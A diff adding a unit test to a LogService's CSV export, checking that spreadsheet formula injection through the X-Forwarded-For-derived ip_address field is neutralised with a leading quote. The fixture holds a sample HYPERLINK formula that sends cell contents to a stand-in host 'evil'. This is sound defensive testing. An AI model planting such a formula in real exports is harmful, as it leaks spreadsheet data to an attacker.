@@ -457,6 +457,41 @@ describe('LogService', () => {
       expect(result.buffer.subarray(0, 3)).toEqual(Buffer.from(bom));
     });
 
+    it('should neutralize CSV formula injection in attacker-influenced cells (ip_address)', async () => {
+      // ip_address is sourced from the unvalidated X-Forwarded-For header and
+      // stored in t_log. A cell beginning with = + - @ (or TAB/CR) must be
+      // prefixed with a single quote so Excel/LibreOffice treat it as text,
+      // not a formula (DDE / data-exfiltration payload).
+      qbMock.getCount.mockResolvedValue(1);
+      qbMock.getRawMany.mockResolvedValue([
+        {
+          log_id: 1,
+          log_type: 1,
+          log_datetime: new Date('2026-04-17T05:30:45Z'),
+          login_id: 'attacker01',
+          ja_id: 100,
+          gamen_name: 'x',
+          operation: 'CREATE',
+          result_status: 1,
+          target_id: 1,
+          target_table: 'm_tanka',
+          ip_address: '=HYPERLINK("http://evil/?"&A1,"click")',
+        },
+      ]);
+
+      const result = await service.exportLogCsv(
+        buildExportLogQuery(),
+        buildSession(),
+        req,
+      );
+      const text = result.buffer.toString('utf8');
+
+      // The dangerous value appears prefixed with a single quote inside quotes,
+      // and never as a bare formula leader `"=`.
+      expect(text).toContain(`"'=HYPERLINK`);
+      expect(text).not.toContain('"=HYPERLINK');
+    });
+
     it('should include the canonical Japanese header row in the CSV when called', async () => {
       qbMock.getCount.mockResolvedValue(0);
       countQbMock.getRawMany.mockResolvedValue([]);
